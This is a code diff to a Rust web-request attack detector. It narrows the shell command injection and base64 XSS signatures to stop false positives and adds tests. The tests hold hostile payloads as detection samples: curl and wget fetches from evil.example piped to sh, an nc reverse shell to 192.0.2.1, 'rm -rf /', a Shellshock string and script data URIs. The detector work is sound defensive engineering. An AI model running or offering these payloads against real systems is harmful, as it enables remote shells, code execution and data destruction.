@@ -8,6 +8,26 @@ use regex::Regex;
 use serde::{Deserialize, Serialize};
 use tracing::{debug, warn};
 
+/// シェルのコマンド名の後に続くもの（#759）。終わり・区切り（`;`・`&`・
+/// `<`・`>`・バッククォート）・閉じ括弧・引用符か、空白と引数らしいもの
+/// （`-`・`/`・`~`・`.`・`$`・引用符・`http(s)://`・`C:\`で始まるもの）。
+/// 英語の文の`; cat lovers`、Markdownの表の`| id |`のように、普通の語や
+/// `|`が続くものは一致しない
+const SHELL_COMMAND_TAIL: &str = r#"(?:\s*$|\s*[;&<>`)'"]|\s+(?:[-/~.$'"]|https?://|[a-z]:\\))"#;
+
+/// CMD-001で見るシェルのコマンド名（#759）
+const SHELL_COMMANDS: &str = "rm|curl|wget|nc|ncat|netcat|telnet|bash|sh|zsh|ksh|dash|cat|\
+     chmod|chown|python[23]?|perl|ruby|php|powershell|pwsh|cmd|id|whoami|uname|ls|ping|nslookup";
+
+/// CMD-001の正規表現（#759）。区切り（`;`・`&`・`|`・改行・バッククォート）
+/// の後のシェルのコマンド（`/bin/`等のパスを付けたものも）に、
+/// [`SHELL_COMMAND_TAIL`]が続くものと、Shellshock（`() { :; };`）
+fn shell_command_injection_pattern() -> String {
+    format!(
+        r"(?i)(?:[;&|\n`]\s*(?:/(?:usr/)?s?bin/)?(?:{SHELL_COMMANDS}){SHELL_COMMAND_TAIL}|\(\)\s*\{{\s*:\s*;\s*\}}\s*;)"
+    )
+}
+
 /// シグネチャ検知器
 pub struct SignatureDetector {
     /// 攻撃パターンデータベース
@@ -316,11 +336,15 @@ impl SignatureDetector {
                 "CSS import injection",
                 vec![],
             )?,
+            // `base64`という語だけでは判定しない（#759。本文の
+            // `"encoding":"base64"`や画像の`data:image/png;base64,`は普通に
+            // 使う）。スクリプト・HTMLとして実行される種類の`data:` URIを
+            // base64で埋め込んだものだけを見る
             AttackPattern::new(
                 "XSS-011",
                 "Base64 Encoded Script",
                 DetectionType::XssAttack,
-                r"(?i)base64",
+                r"(?i)data\s*:\s*(?:text/(?:html|javascript|ecmascript|xml)|application/(?:x-)?(?:javascript|ecmascript|xhtml\+xml)|image/svg\+xml)\s*;\s*(?:charset\s*=\s*[\w-]+\s*;\s*)?base64\s*,",
                 Severity::High,
                 "Base64 encoded XSS",
                 vec![],
@@ -459,11 +483,16 @@ impl SignatureDetector {
 
         // Command Injection パターン (10パターン)
         patterns.extend(vec![
+            // 記号だけでは判定しない（#759。`Cookie: a=b; c=d`、ブラウザの
+            // User-Agentの`;`、本文の`&`・`<`で、普通の要求を断っていた）。
+            // コマンドの区切り（`;`・`&`・`|`・改行）の後にシェルのコマンドが
+            // 続き、その後が終わり・区切り・引数（`-`・`/`等で始まるもの）の
+            // ときと、Shellshock（`() { :; };`）だけを見る
             AttackPattern::new(
                 "CMD-001",
                 "Shell Command Injection",
                 DetectionType::Other,
-                r"[;&|$<>]",
+                &shell_command_injection_pattern(),
                 Severity::Critical,
                 "Shell command injection",
                 vec![],
@@ -486,11 +515,14 @@ impl SignatureDetector {
                 "Dollar parenthesis command",
                 vec![],
             )?,
+            // CMD-004・005も、コマンド名の後に引数らしいもの等が続くときだけ
+            // （#759。`| identity`、Markdownの表の`| id |`、`; delivery`・
+            // `; format: json`で、普通の要求を断っていた）
             AttackPattern::new(
                 "CMD-004",
                 "Pipe Command",
                 DetectionType::Other,
-                r"\|\s*(cat|ls|pwd|whoami|id)",
+                &format!(r"(?i)\|\s*(?:cat|ls|pwd|whoami|id){SHELL_COMMAND_TAIL}"),
                 Severity::High,
                 "Piped command execution",
                 vec![],
@@ -499,7 +531,7 @@ impl SignatureDetector {
                 "CMD-005",
                 "Semicolon Command",
                 DetectionType::Other,
-                r";\s*(rm|del|format|kill)",
+                &format!(r"(?i);\s*(?:rm|del|format|kill){SHELL_COMMAND_TAIL}"),
                 Severity::Critical,
                 "Semicolon command chaining",
                 vec![],
@@ -508,7 +540,7 @@ impl SignatureDetector {
                 "CMD-006",
                 "Ampersand Command",
                 DetectionType::Other,
-                r"&&\s*(wget|curl|nc|netcat)",
+                r"&&\s*(wget|curl|nc|netcat)\b",
                 Severity::Critical,
                 "Ampersand command chaining",
                 vec![],
@@ -780,5 +812,163 @@ mod tests {
         let result = detector.detect(&request).await.unwrap();
         assert!(!result.matched);
         assert_eq!(result.confidence, 0.0);
+    }
+
+    fn request_with(
+        query: &[(&str, &str)],
+        headers: &[(&str, &str)],
+        body: Option<&str>,
+    ) -> RequestData {
+        RequestData {
+            request_id: "test-759".to_string(),
+            method: "POST".to_string(),
+            path: "/mcp".to_string(),
+            query_params: query
+                .iter()
+                .map(|(k, v)| (k.to_string(), v.to_string()))
+                .collect(),
+            headers: headers
+                .iter()
+                .map(|(k, v)| (k.to_string(), v.to_string()))
+                .collect(),
+            body: body.map(|b| b.as_bytes().to_vec()),
+            source_ip: None,
+            caller_id: None,
+            timestamp: Utc::now(),
+        }
+    }
+
+    /// ブラウザのUser-Agent・複数のCookie・`&`・`<`・`;`・`base64`を含む
+    /// JSONの本文は、どのパターンにも当たらない（#759。以前はCMD-001
+    /// （Critical）・XSS-011（High）に当たり、HTTP 403になった）
+    #[tokio::test]
+    async fn test_ordinary_headers_and_bodies_are_not_attacks() {
+        let detector = SignatureDetector::new().await.unwrap();
+        let user_agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+            "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+        ];
+        let cookies = [
+            "a=b; c=d",
+            "theme=dark; locale=ja; id=42; sh=1",
+            "session=abc123; cat=books; ls=1",
+        ];
+        let bodies = [
+            r#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"upload_media","arguments":{"encoding":"base64","data":"iVBORw0KGgo=","mime_type":"image/png"}}}"#,
+            r#"{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"create_post","arguments":{"title":"Q&A; tips & tricks","content":"<p>R&amp;D: a < b; c > d</p>"}}}"#,
+            r#"{"content":"<img src=\"data:image/png;base64,iVBORw0KGgo=\">"}"#,
+            r#"{"content":"| id | name |\n| 1 | cat |","note":"price; delivery in 3 days; format: json"}"#,
+            r#"{"content":"I like dogs; cat lovers disagree | identity & ls of things"}"#,
+        ];
+        for ua in user_agents {
+            for cookie in cookies {
+                let request = request_with(&[], &[("User-Agent", ua), ("Cookie", cookie)], None);
+                let result = detector.detect(&request).await.unwrap();
+                assert!(
+                    !result.matched,
+                    "{ua} / {cookie}: {:?}",
+                    result.pattern_names
+                );
+            }
+        }
+        for body in bodies {
+            let result = detector
+                .detect(&request_with(&[], &[], Some(body)))
+                .await
+                .unwrap();
+            assert!(!result.matched, "{body}: {:?}", result.pattern_names);
+        }
+    }
+
+    /// コマンドの実行を示すものは、引き続きCMD-001等で検知する（#759）
+    #[tokio::test]
+    async fn test_shell_command_injection_is_still_detected() {
+        let detector = SignatureDetector::new().await.unwrap();
+        let payloads = [
+            "x; id",
+            "x;id\"",
+            "x; cat /etc/hosts",
+            "a | sh",
+            "a|bash -i",
+            "foo && curl http://evil.example/x",
+            "foo & wget https://evil.example/x",
+            "x; /bin/sh -c 'uname -a'",
+            "x\nwhoami",
+            "x; nc -e /bin/sh 192.0.2.1 4444",
+            "ls; rm -rf /",
+            "x; python3 -c 'print(1)'",
+            "x | id",
+        ];
+        for payload in payloads {
+            let result = detector
+                .detect(&request_with(&[("q", payload)], &[], None))
+                .await
+                .unwrap();
+            assert!(result.matched, "{payload}");
+            assert!(
+                result.severity >= Severity::High,
+                "{payload}: {:?}",
+                result.severity
+            );
+        }
+        // Shellshock（User-Agent）
+        let result = detector
+            .detect(&request_with(
+                &[],
+                &[("User-Agent", "() { :; }; echo vulnerable")],
+                None,
+            ))
+            .await
+            .unwrap();
+        assert!(
+            result
+                .pattern_names
+                .contains(&"Shell Command Injection".to_string()),
+            "{:?}",
+            result.pattern_names
+        );
+        // Cookieの値の中のコマンド
+        let result = detector
+            .detect(&request_with(
+                &[],
+                &[("Cookie", "a=b; c=d; e=x;curl http://evil.example|sh")],
+                None,
+            ))
+            .await
+            .unwrap();
+        assert_eq!(
+            result.severity,
+            Severity::Critical,
+            "{:?}",
+            result.pattern_names
+        );
+    }
+
+    /// XSS-011は、スクリプト・HTMLとして実行される種類の`data:` URIの
+    /// base64だけを検知する（#759）
+    #[tokio::test]
+    async fn test_base64_script_data_uri_is_still_detected() {
+        let detector = SignatureDetector::new().await.unwrap();
+        for body in [
+            "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>",
+            "<iframe src=DATA:text/html;charset=utf-8;base64,PHNjcmlwdD4=>",
+            "<embed src=\"data:image/svg+xml;base64,PHN2Zz4=\">",
+            "<script src=\"data:application/javascript;base64,YWxlcnQoMSk=\"></script>",
+        ] {
+            let result = detector
+                .detect(&request_with(&[], &[], Some(body)))
+                .await
+                .unwrap();
+            assert!(
+                result
+                    .pattern_names
+                    .contains(&"Base64 Encoded Script".to_string()),
+                "{body}: {:?}",
+                result.pattern_names
+            );
+            assert_eq!(result.detection_type, DetectionType::XssAttack);
+        }
     }
 }
